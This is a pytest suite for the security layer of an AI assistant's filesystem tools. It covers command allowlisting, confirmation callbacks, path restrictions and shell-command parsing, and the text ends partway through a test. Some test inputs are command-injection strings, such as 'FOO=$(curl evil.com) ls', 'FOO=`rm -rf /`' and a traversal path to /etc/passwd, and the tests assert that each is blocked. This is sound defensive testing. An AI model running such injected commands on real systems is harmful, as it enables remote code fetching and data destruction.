"""Tests for filesystem tools security: command allowlist, path restrictions, and confirmations"""

import json

import pytest

from ai_assist.config import AiAssistConfig
from ai_assist.filesystem_tools import (
    ALLOWED_COMMANDS_FILE,
    ALLOWED_PATHS_FILE,
    PRIVILEGE_WRAPPERS,
    SHELL_BUILTINS,
    TRANSPARENT_WRAPPERS,
    FilesystemTools,
    _extract_command_argument_paths,
    _is_safe_env_assignment,
    _split_shell_commands,
    _strip_shell_comments,
    compute_allowlist_prefix,
    extract_command_names,
)

# --- Phase 1: Command allowlist + user confirmation ---


@pytest.mark.asyncio
async def test_allowlisted_command_executes_directly():
    """Allowlisted commands like ls, grep run without confirmation"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "ls /tmp"})

    assert "Error" not in result or "not found" not in result.lower()
    assert "not allowed" not in result.lower()


@pytest.mark.asyncio
async def test_non_allowlisted_command_blocked_without_callback(tmp_path, monkeypatch):
    """Non-allowlisted commands return error when no confirmation callback is set"""
    monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)
    # No confirmation_callback set

    result = await tools.execute_tool("execute_command", {"command": "curl http://example.com"})

    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_non_allowlisted_command_prompts_user(tmp_path, monkeypatch):
    """Non-allowlisted commands call the confirmation callback when set"""
    monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    callback_called = False

    async def mock_callback(command: str) -> bool:
        nonlocal callback_called
        callback_called = True
        return True

    tools.confirmation_callback = mock_callback

    await tools.execute_tool("execute_command", {"command": "curl http://example.com"})

    assert callback_called


@pytest.mark.asyncio
async def test_user_rejects_command(tmp_path, monkeypatch):
    """When user rejects via callback, command is not executed"""
    monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    async def reject_callback(command: str) -> bool:
        return False

    tools.confirmation_callback = reject_callback

    result = await tools.execute_tool("execute_command", {"command": "curl http://example.com"})

    assert "rejected" in result.lower()
    assert "allowed commands" in result.lower()


@pytest.mark.asyncio
async def test_user_approves_command():
    """When user approves via callback, command runs"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    async def approve_callback(command: str) -> bool:
        return True

    tools.confirmation_callback = approve_callback

    result = await tools.execute_tool("execute_command", {"command": "echo approved"})

    assert "approved" in result


@pytest.mark.asyncio
async def test_allowlist_checks_first_token():
    """Allowlist extracts command name from first token, including full paths and pipes"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    # Bare allowlisted command should work
    result = await tools.execute_tool("execute_command", {"command": "ls /tmp"})
    assert "not allowed" not in result.lower()

    # Full path is NOT matched by bare allowlist entry — different binary could live there
    result = await tools.execute_tool("execute_command", {"command": "/usr/bin/ls /tmp"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()

    # Pipe with allowlisted first command should work (shell constructs preserved)
    result = await tools.execute_tool("execute_command", {"command": "ls /tmp | grep test"})
    assert "not allowed" not in result.lower()

    # Non-allowlisted command is still blocked
    result = await tools.execute_tool("execute_command", {"command": "rm -rf /tmp/test"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_full_path_allowlist_requires_exact_match():
    """Full-path commands must be explicitly allowlisted — basename alone won't match"""
    config = AiAssistConfig(anthropic_api_key="test")

    # With only bare "ls" in allowlist, a full path is blocked
    tools_bare = FilesystemTools(config, load_user_config=False)
    result = await tools_bare.execute_tool("execute_command", {"command": "/usr/bin/ls /tmp"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()

    # With "/usr/bin/ls" explicitly in allowlist, the full path works
    config_full = AiAssistConfig(
        anthropic_api_key="test", allowed_commands=list(config.allowed_commands) + ["/usr/bin/ls"]
    )
    tools_full = FilesystemTools(config_full, load_user_config=False)
    result = await tools_full.execute_tool("execute_command", {"command": "/usr/bin/ls /tmp"})
    assert "not allowed" not in result.lower()

    # But a different path to the same basename is still blocked
    result = await tools_full.execute_tool("execute_command", {"command": "/tmp/evil/ls /tmp"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_no_timeout_in_interactive_mode():
    """In interactive mode (callback set), no timeout is applied"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    async def approve_all(command: str) -> bool:
        return True

    # Non-interactive: timeout is applied (default 30s, capped at 300s)
    assert tools.confirmation_callback is None

    # Interactive: setting callback signals interactive mode
    tools.confirmation_callback = approve_all

    # sleep 1 should complete fine without being killed by timeout
    result = await tools.execute_tool("execute_command", {"command": "sleep 1 && echo done"})
    assert "done" in result


@pytest.mark.asyncio
async def test_custom_allowlist_from_config():
    """Config overrides default allowlist"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["echo", "pwd"])
    tools = FilesystemTools(config, load_user_config=False)

    # 'echo' is in custom allowlist - should work
    result = await tools.execute_tool("execute_command", {"command": "echo hello"})
    assert "hello" in result

    # 'ls' is NOT in custom allowlist - should be blocked without callback
    result = await tools.execute_tool("execute_command", {"command": "ls /tmp"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


# --- Phase 2: Filesystem path restrictions ---


@pytest.mark.asyncio
async def test_read_file_allowed_path(tmp_path):
    """Reading a file under an allowed path succeeds"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path)])
    tools = FilesystemTools(config, load_user_config=False)

    test_file = tmp_path / "test.txt"
    test_file.write_text("hello world")

    result = await tools.execute_tool("read_file", {"path": str(test_file)})

    assert "hello world" in result
    assert "Error" not in result


@pytest.mark.asyncio
async def test_read_file_blocked_path(tmp_path):
    """Reading a file outside allowed paths returns error"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
    tools = FilesystemTools(config, load_user_config=False)

    blocked_file = tmp_path / "blocked" / "secret.txt"
    blocked_file.parent.mkdir(parents=True, exist_ok=True)
    blocked_file.write_text("secret data")

    result = await tools.execute_tool("read_file", {"path": str(blocked_file)})

    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_create_directory_blocked_path(tmp_path):
    """Cannot create directory outside allowed paths"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("create_directory", {"path": str(tmp_path / "blocked" / "new_dir")})

    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_custom_allowed_paths_from_config(tmp_path):
    """Config overrides default allowed paths"""
    custom_dir = tmp_path / "custom"
    custom_dir.mkdir()
    test_file = custom_dir / "data.txt"
    test_file.write_text("custom data")

    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(custom_dir)])
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("read_file", {"path": str(test_file)})
    assert "custom data" in result


@pytest.mark.asyncio
async def test_path_traversal_blocked(tmp_path):
    """Path traversal attempts (../../) are resolved and blocked"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(allowed_dir)])
    tools = FilesystemTools(config, load_user_config=False)

    # Try to traverse out of allowed directory
    traversal_path = str(allowed_dir / ".." / ".." / "etc" / "passwd")
    result = await tools.execute_tool("read_file", {"path": traversal_path})

    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_list_directory_blocked_path(tmp_path):
    """Cannot list directory outside allowed paths"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
    tools = FilesystemTools(config, load_user_config=False)

    blocked_dir = tmp_path / "blocked"
    blocked_dir.mkdir()

    result = await tools.execute_tool("list_directory", {"path": str(blocked_dir)})

    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_search_in_file_blocked_path(tmp_path):
    """Cannot search file outside allowed paths"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path / "allowed")])
    tools = FilesystemTools(config, load_user_config=False)

    blocked_file = tmp_path / "blocked" / "data.txt"
    blocked_file.parent.mkdir(parents=True, exist_ok=True)
    blocked_file.write_text("secret data")

    result = await tools.execute_tool("search_in_file", {"path": str(blocked_file), "pattern": "secret"})

    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_empty_allowed_paths_allows_all(tmp_path):
    """When allowed_paths is empty, all paths are accessible (backwards compat)"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[])
    tools = FilesystemTools(config, load_user_config=False)

    test_file = tmp_path / "anywhere.txt"
    test_file.write_text("accessible")

    result = await tools.execute_tool("read_file", {"path": str(test_file)})
    assert "accessible" in result


# --- Phase 4: Confirmation for destructive tools ---


@pytest.mark.asyncio
async def test_create_directory_prompts_confirmation(tmp_path):
    """create_directory triggers confirmation callback when in confirm_tools"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path)],
        confirm_tools=["internal__create_directory"],
    )
    tools = FilesystemTools(config, load_user_config=False)

    callback_called = False

    async def mock_callback(command: str) -> bool:
        nonlocal callback_called
        callback_called = True
        return True

    tools.confirmation_callback = mock_callback

    result = await tools.execute_tool("create_directory", {"path": str(tmp_path / "new_dir")})

    assert callback_called
    assert "created" in result.lower() or "Error" not in result


@pytest.mark.asyncio
async def test_configurable_confirm_tools_list(tmp_path):
    """Config controls which tools prompt for confirmation"""
    # create_directory NOT in confirm_tools - should proceed without callback
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path)],
        confirm_tools=[],
    )
    tools = FilesystemTools(config, load_user_config=False)

    callback_called = False

    async def mock_callback(command: str) -> bool:
        nonlocal callback_called
        callback_called = True
        return True

    tools.confirmation_callback = mock_callback

    result = await tools.execute_tool("create_directory", {"path": str(tmp_path / "no_confirm_dir")})

    assert not callback_called
    assert "created" in result.lower()


# --- Phase 5: Persistent command allowlist ---


def test_add_permanent_allowed_command(tmp_path):
    """add_permanent_allowed_command persists command to JSON file"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    json_file = tmp_path / ALLOWED_COMMANDS_FILE
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

        tools.add_permanent_allowed_command("curl")

    assert "curl" in tools.allowed_commands

    data = json.loads(json_file.read_text())
    assert "curl" in data


def test_add_permanent_allowed_command_no_duplicate(tmp_path):
    """Adding the same command twice does not create duplicates"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    json_file = tmp_path / ALLOWED_COMMANDS_FILE
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

        tools.add_permanent_allowed_command("curl")
        tools.add_permanent_allowed_command("curl")

    data = json.loads(json_file.read_text())
    assert data.count("curl") == 1


def test_load_user_allowed_commands(tmp_path):
    """Commands from persistent JSON file are loaded at init"""
    json_file = tmp_path / ALLOWED_COMMANDS_FILE
    json_file.write_text(json.dumps(["docker", "podman"]))

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

        config = AiAssistConfig(anthropic_api_key="test")
        tools = FilesystemTools(config)

    assert "docker" in tools.allowed_commands
    assert "podman" in tools.allowed_commands


def test_load_user_allowed_commands_no_file():
    """Missing JSON file does not cause errors"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)
    # Should not raise - the file simply doesn't exist
    assert len(tools.allowed_commands) > 0  # has defaults


def test_load_user_allowed_commands_corrupt_json(tmp_path):
    """Corrupt JSON file is silently ignored"""
    json_file = tmp_path / ALLOWED_COMMANDS_FILE
    json_file.write_text("not valid json {{{")

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

        config = AiAssistConfig(anthropic_api_key="test")
        tools = FilesystemTools(config, load_user_config=False)

    # Should still have defaults, no crash
    assert len(tools.allowed_commands) > 0


@pytest.mark.asyncio
async def test_permanently_allowed_command_executes(tmp_path):
    """A permanently added command runs without confirmation callback"""
    json_file = tmp_path / ALLOWED_COMMANDS_FILE
    json_file.write_text(json.dumps(["echo"]))

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
        tools = FilesystemTools(config, load_user_config=False)

    # echo is not in the config allowlist but is in the persistent file
    result = await tools.execute_tool("execute_command", {"command": "echo persistent"})
    assert "persistent" in result


# --- Phase 7: Interactive path approval ---


@pytest.mark.asyncio
async def test_blocked_path_calls_path_confirmation_callback(tmp_path):
    """When path is blocked and path_confirmation_callback is set, it is called"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path / "allowed")],
    )
    tools = FilesystemTools(config, load_user_config=False)

    blocked_file = tmp_path / "blocked" / "data.txt"
    blocked_file.parent.mkdir(parents=True, exist_ok=True)
    blocked_file.write_text("hello")

    callback_called_with = None

    async def mock_path_callback(description: str) -> bool:
        nonlocal callback_called_with
        callback_called_with = description
        return True

    tools.path_confirmation_callback = mock_path_callback

    result = await tools.execute_tool("read_file", {"path": str(blocked_file)})

    assert callback_called_with is not None
    assert "hello" in result


@pytest.mark.asyncio
async def test_blocked_path_user_rejects(tmp_path):
    """When user rejects path via callback, access is denied"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path / "allowed")],
    )
    tools = FilesystemTools(config, load_user_config=False)

    blocked_file = tmp_path / "blocked" / "data.txt"
    blocked_file.parent.mkdir(parents=True, exist_ok=True)
    blocked_file.write_text("secret")

    async def reject_callback(description: str) -> bool:
        return False

    tools.path_confirmation_callback = reject_callback

    result = await tools.execute_tool("read_file", {"path": str(blocked_file)})

    assert "rejected" in result.lower() or "not allowed" in result.lower()
    assert "secret" not in result


@pytest.mark.asyncio
async def test_blocked_path_no_callback_still_blocks(tmp_path):
    """Without callback, blocked paths return error (existing behavior)"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path / "allowed")],
    )
    tools = FilesystemTools(config, load_user_config=False)

    blocked_file = tmp_path / "blocked" / "data.txt"
    blocked_file.parent.mkdir(parents=True, exist_ok=True)
    blocked_file.write_text("secret")

    # No path_confirmation_callback set
    result = await tools.execute_tool("read_file", {"path": str(blocked_file)})

    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_path_callback_works_for_search_in_file(tmp_path):
    """Path confirmation callback works for search_in_file too"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path / "allowed")],
    )
    tools = FilesystemTools(config, load_user_config=False)

    blocked_file = tmp_path / "blocked" / "data.txt"
    blocked_file.parent.mkdir(parents=True, exist_ok=True)
    blocked_file.write_text("findme\nother line")

    async def approve_callback(description: str) -> bool:
        return True

    tools.path_confirmation_callback = approve_callback

    result = await tools.execute_tool("search_in_file", {"path": str(blocked_file), "pattern": "findme"})

    assert "findme" in result


@pytest.mark.asyncio
async def test_path_callback_works_for_list_directory(tmp_path):
    """Path confirmation callback works for list_directory too"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(tmp_path / "allowed")],
    )
    tools = FilesystemTools(config, load_user_config=False)

    blocked_dir = tmp_path / "blocked"
    blocked_dir.mkdir(parents=True, exist_ok=True)
    (blocked_dir / "file.txt").write_text("x")

    async def approve_callback(description: str) -> bool:
        return True

    tools.path_confirmation_callback = approve_callback

    result = await tools.execute_tool("list_directory", {"path": str(blocked_dir)})

    assert "file.txt" in result


# --- Phase 8: Persistent path allowlist ---


def test_add_permanent_allowed_path(tmp_path):
    """add_permanent_allowed_path persists path to JSON file"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    new_path = str(tmp_path / "new-allowed")

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        tools.add_permanent_allowed_path(new_path)

    from pathlib import Path

    assert Path(new_path).resolve() in tools.allowed_paths

    json_file = tmp_path / ALLOWED_PATHS_FILE
    data = json.loads(json_file.read_text())
    assert new_path in data


def test_add_permanent_allowed_path_no_duplicate(tmp_path):
    """Adding the same path twice does not create duplicates"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    new_path = str(tmp_path / "dup-path")

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        tools.add_permanent_allowed_path(new_path)
        tools.add_permanent_allowed_path(new_path)

    json_file = tmp_path / ALLOWED_PATHS_FILE
    data = json.loads(json_file.read_text())
    assert data.count(new_path) == 1


def test_load_user_allowed_paths(tmp_path):
    """Paths from persistent JSON file are loaded at init"""
    json_file = tmp_path / ALLOWED_PATHS_FILE
    json_file.write_text(json.dumps(["/opt/custom", "/data/shared"]))

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        config = AiAssistConfig(anthropic_api_key="test")
        tools = FilesystemTools(config)

    from pathlib import Path

    assert Path("/opt/custom").resolve() in tools.allowed_paths
    assert Path("/data/shared").resolve() in tools.allowed_paths


def test_load_user_allowed_paths_no_file():
    """Missing JSON file does not cause errors"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)
    # Should not raise - the file simply doesn't exist
    assert len(tools.allowed_paths) > 0  # has defaults


def test_load_user_allowed_paths_corrupt_json(tmp_path):
    """Corrupt JSON file is silently ignored"""
    json_file = tmp_path / ALLOWED_PATHS_FILE
    json_file.write_text("not valid json {{{")

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        config = AiAssistConfig(anthropic_api_key="test")
        tools = FilesystemTools(config, load_user_config=False)

    # Should still have defaults, no crash
    assert len(tools.allowed_paths) > 0


@pytest.mark.asyncio
async def test_permanently_allowed_path_accessible(tmp_path):
    """A permanently added path is accessible without callback"""
    target_dir = tmp_path / "persistent-allowed"
    target_dir.mkdir()
    test_file = target_dir / "data.txt"
    test_file.write_text("persistent data")

    json_file = tmp_path / ALLOWED_PATHS_FILE
    json_file.write_text(json.dumps([str(target_dir)]))

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        config = AiAssistConfig(
            anthropic_api_key="test",
            allowed_paths=[str(tmp_path / "other")],
        )
        tools = FilesystemTools(config)

    result = await tools.execute_tool("read_file", {"path": str(test_file)})
    assert "persistent data" in result


# --- Phase 9: Local skill paths auto-allowed ---


def test_local_skill_paths_added_to_allowed_paths(tmp_path):
    """Local skills have their paths automatically added to allowed_paths on startup"""

    from ai_assist.agent import AiAssistAgent
    from ai_assist.skills_manager import InstalledSkill

    config = AiAssistConfig(
        anthropic_api_key="test-key",
        model="claude-3-5-sonnet-20241022",
        mcp_servers={},
    )
    agent = AiAssistAgent(config)

    # Simulate a local skill in the installed list
    local_path = tmp_path / "my-local-skill"
    local_path.mkdir()
    agent.skills_manager.installed_skills = [
        InstalledSkill(
            name="test-local",
            source=str(local_path),
            source_type="local",
            branch="main",
            installed_at="2026-01-01T00:00:00",
            cache_path=str(local_path),
        ),
    ]

    agent._allow_local_skill_paths()

    assert local_path.resolve() in agent.filesystem_tools.allowed_paths


def test_all_skill_paths_added_to_allowed_paths(tmp_path):
    """All installed skill cache paths are added to allowed paths regardless of source type"""
    from ai_assist.agent import AiAssistAgent
    from ai_assist.skills_manager import InstalledSkill

    config = AiAssistConfig(
        anthropic_api_key="test-key",
        model="claude-3-5-sonnet-20241022",
        mcp_servers={},
    )
    agent = AiAssistAgent(config)

    initial_count = len(agent.filesystem_tools.allowed_paths)

    cache_path = tmp_path / "cache"
    agent.skills_manager.installed_skills = [
        InstalledSkill(
            name="some-git-skill",
            source="owner/repo",
            source_type="git",
            branch="main",
            installed_at="2026-01-01T00:00:00",
            cache_path=str(cache_path),
        ),
    ]

    agent._allow_local_skill_paths()

    assert len(agent.filesystem_tools.allowed_paths) == initial_count + 1
    assert cache_path.resolve() in agent.filesystem_tools.allowed_paths


# --- Phase 10: Smart command parsing ---


class TestStripShellComments:
    """Tests for _strip_shell_comments()"""

    def test_no_comment(self):
        assert _strip_shell_comments("ls /tmp") == "ls /tmp"

    def test_full_line_comment(self):
        assert _strip_shell_comments("# this is a comment").strip() == ""

    def test_inline_comment(self):
        result = _strip_shell_comments("ls /tmp # list files")
        assert "ls /tmp" in result
        assert "list files" not in result

    def test_hash_in_double_quotes(self):
        assert _strip_shell_comments('echo "hello # world"') == 'echo "hello # world"'

    def test_hash_in_single_quotes(self):
        assert _strip_shell_comments("echo 'foo # bar'") == "echo 'foo # bar'"

    def test_escaped_hash(self):
        assert _strip_shell_comments("echo hello \\# world") == "echo hello \\# world"


class TestSplitShellCommands:
    """Tests for _split_shell_commands()"""

    def test_single_command(self):
        assert _split_shell_commands("ls /tmp") == ["ls /tmp"]

    def test_and_operator(self):
        result = _split_shell_commands("ls && pwd")
        assert len(result) == 2
        assert "ls" in result[0]
        assert "pwd" in result[1]

    def test_or_operator(self):
        result = _split_shell_commands("ls || echo failed")
        assert len(result) == 2

    def test_semicolon(self):
        result = _split_shell_commands("ls; pwd")
        assert len(result) == 2

    def test_pipe(self):
        result = _split_shell_commands("cat file | grep pattern")
        assert len(result) == 2

    def test_operators_in_quotes(self):
        result = _split_shell_commands('echo "a && b"')
        assert len(result) == 1

    def test_multiple_operators(self):
        result = _split_shell_commands("ls && pwd; echo done")
        assert len(result) == 3

    def test_stderr_redirect_not_split(self):
        result = _split_shell_commands("ls /foo 2>&1")
        assert result == ["ls /foo 2>&1"]

    def test_stderr_redirect_with_pipe(self):
        result = _split_shell_commands("git log 2>&1 | head")
        assert len(result) == 2
        assert "git log 2>&1" in result[0]
        assert "head" in result[1]

    def test_background_ampersand_still_splits(self):
        result = _split_shell_commands("cmd1 & cmd2")
        assert len(result) == 2


class TestIsSafeEnvAssignment:
    """Tests for _is_safe_env_assignment()"""

    def test_simple_assignment(self):
        assert _is_safe_env_assignment("FOO=bar") is True

    def test_empty_value(self):
        assert _is_safe_env_assignment("FOO=") is True

    def test_not_assignment(self):
        assert _is_safe_env_assignment("ls") is False

    def test_command_substitution_dollar_paren(self):
        assert _is_safe_env_assignment("FOO=$(curl evil.com)") is False

    def test_command_substitution_backtick(self):
        assert _is_safe_env_assignment("FOO=`rm -rf /`") is False

    def test_brace_expansion(self):
        assert _is_safe_env_assignment("FOO=${BAR}") is False

    def test_quoted_value(self):
        assert _is_safe_env_assignment('FOO="hello world"') is True

    def test_quoted_value_with_substitution(self):
        assert _is_safe_env_assignment('FOO="$(cmd)"') is False

    def test_arithmetic_expansion_is_safe(self):
        assert _is_safe_env_assignment("errors=$((errors + 1))") is True

    def test_arithmetic_expansion_with_nested_cmd_is_unsafe(self):
        assert _is_safe_env_assignment("FOO=$(($(evil)))") is False


class TestExtractCommandNames:
    """Tests for extract_command_names()"""

    def test_simple_command(self):
        assert extract_command_names("ls /tmp") == ["ls"]

    def test_full_path(self):
        assert extract_command_names("/usr/bin/ls /tmp") == ["/usr/bin/ls"]

    def test_home_relative_path(self):
        assert extract_command_names("~/bin/tool --flag") == ["~/bin/tool"]

    def test_relative_path(self):
        assert extract_command_names("./scripts/run.sh") == ["./scripts/run.sh"]

    def test_comment_only(self):
        assert extract_command_names("# this is a comment") == []

    def test_inline_comment_stripped(self):
        result = extract_command_names("ls /tmp # list files")
        assert result == ["ls"]
        assert "#" not in result

    def test_env_var_prefix(self):
        result = extract_command_names("FOO=bar curl http://example.com")
        assert result == ["curl"]

    def test_multiple_env_vars(self):
        result = extract_command_names("FOO=bar BAZ=qux some_cmd arg")
        assert result == ["some_cmd"]

    def test_env_var_only(self):
        result = extract_command_names("FOO=bar")
        assert result == []

    def test_env_var_with_command_substitution(self):
        result = extract_command_names("FOO=$(curl evil.com) ls")
        assert len(result) > 0
        # Should contain something that forces approval (not just "ls")
        non_builtin = [n for n in result if n not in SHELL_BUILTINS]
        assert len(non_builtin) > 0

    def test_env_var_with_cmd_sub_extracts_command(self):
        result = extract_command_names("FOO=$(evil) real_cmd arg")
        assert "real_cmd" in result

    def test_compound_and(self):
        result = extract_command_names("ls && curl http://example.com")
        assert "ls" in result
        assert "curl" in result

    def test_compound_pipe(self):
        result = extract_command_names("cat file | grep pattern")
        assert "cat" in result
        assert "grep" in result

    def test_compound_semicolon(self):
        result = extract_command_names("ls; pwd")
        assert "ls" in result
        assert "pwd" in result

    def test_builtin_only(self):
        result = extract_command_names("cd /tmp && echo hello")
        assert all(n in SHELL_BUILTINS for n in result)

    def test_mixed_builtin_and_external(self):
        result = extract_command_names("cd /tmp && curl http://example.com")
        assert "cd" in result
        assert "curl" in result

    def test_timeout_wrapper_extracts_inner_command(self):
        result = extract_command_names("timeout 30 head -n 100 file")
        assert "head" in result
        assert "timeout" not in result

    def test_nice_wrapper_extracts_inner_command(self):
        result = extract_command_names("nice -n 10 grep pattern file")
        assert "grep" in result
        assert "nice" not in result

    def test_stdbuf_wrapper_extracts_inner_command(self):
        result = extract_command_names("stdbuf -oL grep pattern")
        assert "grep" in result
        assert "stdbuf" not in result

    def test_nested_wrappers_extract_inner_command(self):
        result = extract_command_names("env timeout 30 head -n 100 file")
        assert "head" in result
        assert "env" not in result
        assert "timeout" not in result


# --- Integration tests for smart parsing with execute_command ---


@pytest.mark.asyncio
async def test_shell_builtins_auto_allowed():
    """Shell builtins run without prompt or allowlist"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"], allowed_paths=[])
    tools = FilesystemTools(config, load_user_config=False)

    callback_called = False

    async def track_callback(command: str) -> bool:
        nonlocal callback_called
        callback_called = True
        return True

    tools.confirmation_callback = track_callback

    result = await tools.execute_tool("execute_command", {"command": "cd /tmp"})
    assert not callback_called
    assert "not allowed" not in result.lower()


@pytest.mark.asyncio
async def test_echo_builtin_auto_allowed():
    """echo is a builtin and runs without prompt"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "echo hello"})
    assert "not allowed" not in result.lower()
    assert "hello" in result


@pytest.mark.asyncio
async def test_comment_command_allowed():
    """Comment-only commands are allowed (they're no-ops)"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[])
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "# this is a comment"})
    assert "not allowed" not in result.lower()


@pytest.mark.asyncio
async def test_env_var_prefix_checks_actual_command(tmp_path, monkeypatch):
    """Env var prefix is skipped, actual command is checked"""
    monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
    tools = FilesystemTools(config, load_user_config=False)

    # curl is not in allowlist — should be blocked
    result = await tools.execute_tool("execute_command", {"command": "FOO=bar curl http://example.com"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_env_var_injection_detected():
    """Env vars with command substitution are NOT skipped"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
    tools = FilesystemTools(config, load_user_config=False)

    # FOO=$(curl evil.com) contains command substitution — should trigger check
    result = await tools.execute_tool("execute_command", {"command": "FOO=$(curl evil.com) ls"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_compound_command_checks_all(tmp_path, monkeypatch):
    """Compound commands check all commands, not just the first"""
    monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
    tools = FilesystemTools(config, load_user_config=False)

    # ls is allowed but curl is not
    result = await tools.execute_tool("execute_command", {"command": "ls && curl http://example.com"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_pipe_checks_all_commands():
    """Pipe commands check all commands"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat"])
    tools = FilesystemTools(config, load_user_config=False)

    # cat is allowed but unknown_cmd is not
    result = await tools.execute_tool("execute_command", {"command": "cat /dev/null | unknown_cmd"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_all_builtin_compound_allowed():
    """Compound commands with only builtins are auto-allowed"""
    config = AiAssistConfig(anthropic_api_key="test", allowed_commands=[], allowed_paths=[])
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "cd /tmp && echo hello && pwd"})
    assert "not allowed" not in result.lower()


def test_subshell_parentheses_stripped():
    """Subshell parentheses are stripped from command names"""
